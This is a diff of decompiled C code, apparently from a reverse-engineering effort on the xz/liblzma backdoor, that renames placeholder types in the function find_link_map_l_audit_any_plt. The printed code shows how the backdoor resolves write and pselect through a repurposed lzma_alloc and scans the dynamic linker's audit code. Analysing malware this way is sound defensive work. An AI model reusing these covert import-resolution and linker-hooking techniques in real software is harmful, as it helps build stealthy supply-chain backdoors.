@@ -24,22 +24,22 @@ BOOL find_link_map_l_audit_any_plt
   u64 uVar3;
   BOOL BVar4;
   lzma_allocator *allocator;
-  _func_23 *p_Var5;
-  _func_24 *p_Var6;
+  pfn_write_t ppVar5;
+  pfn_pselect_t ppVar6;
   long lVar7;
   undefined1 uVar8;
-  _func_64 *code_start;
+  dl_audit_symbind_alt_fn code_start;
   u8 *puVar9;
   dasm_ctx_t *pdVar10;
   instruction_search_ctx_t *piVar11;
   undefined4 *puVar12;
   undefined1 uVar13;
-  _func_64 *code_end;
+  dl_audit_symbind_alt_fn code_end;
   byte bVar14;
   instruction_search_ctx_t search_state;
-  _func_64 *audit_stub;
-  _func_23 *write_stub;
-  _func_24 *pselect_stub;
+  dl_audit_symbind_alt_fn audit_stub;
+  pfn_write_t write_stub;
+  pfn_pselect_t pselect_stub;
   undefined4 local_c8;
   undefined4 local_c4;
   instruction_search_ctx_t local_c0;
@@ -58,10 +58,10 @@ BOOL find_link_map_l_audit_any_plt
     local_c4 = 0;
     allocator = get_lzma_allocator();
     allocator->opaque = data->elf_handles->libc;
-    p_Var5 = (_func_23 *)lzma_alloc(0x380,allocator);
+    ppVar5 = (pfn_write_t)lzma_alloc(0x380,allocator);
     uVar2 = local_c4;
-    plVar1->write = p_Var5;
-    if (p_Var5 != (_func_23 *)0x0) {
+    plVar1->write = ppVar5;
+    if (ppVar5 != (pfn_write_t)0x0) {
       plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
     }
     code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
@@ -71,9 +71,9 @@ BOOL find_link_map_l_audit_any_plt
     code_end = code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size;
     local_c4._3_1_ = SUB41(uVar2,3);
     local_c4._0_3_ = CONCAT12(0xff,(ushort)local_c4);
-    p_Var6 = (_func_24 *)lzma_alloc(0x690,allocator);
-    plVar1->pselect = p_Var6;
-    if (p_Var6 != (_func_24 *)0x0) {
+    ppVar6 = (pfn_pselect_t)lzma_alloc(0x690,allocator);
+    plVar1->pselect = ppVar6;
+    if (ppVar6 != (pfn_pselect_t)0x0) {
       plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
     }
     while ((code_start < code_end &&
